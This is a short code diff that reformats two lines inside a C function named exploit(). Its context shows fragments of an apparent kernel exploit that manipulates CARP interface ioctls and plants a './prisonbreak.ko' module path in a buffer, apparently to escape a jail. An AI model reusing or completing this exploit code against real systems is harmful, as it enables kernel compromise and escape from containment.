@@ -121,8 +121,7 @@ void* exploit(void* arg) {
   ifr_get.ifr_data = (caddr_t)&carpr_get;
   ifr_set.ifr_data = (caddr_t)&carpr_set;
 
-  carpr_get[0].carpr_vhid =
-      0;  // Instruct kernel we want info on all carp interfaces
+  carpr_get[0].carpr_vhid = 0;  // Instruct kernel we want info on all carp interfaces
   carpr_get[0].carpr_count = NUM_CARP_IFS;
 
   strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
@@ -191,8 +190,7 @@ void* exploit(void* arg) {
   // Fill the buffer with cyclic data to make it easy to calculate offsets
   // cyclic((char *)header, len);
 
-  unsigned long* kernel_module_path =
-      (unsigned long*)(header + sizeof(synchdr_t));
+  unsigned long* kernel_module_path = (unsigned long*)(header + sizeof(synchdr_t));
   strcpy((char*)kernel_module_path, "./prisonbreak.ko");
 
   // unsigned long *arguments = (unsigned long *)(header + sizeof(synchdr_t) +
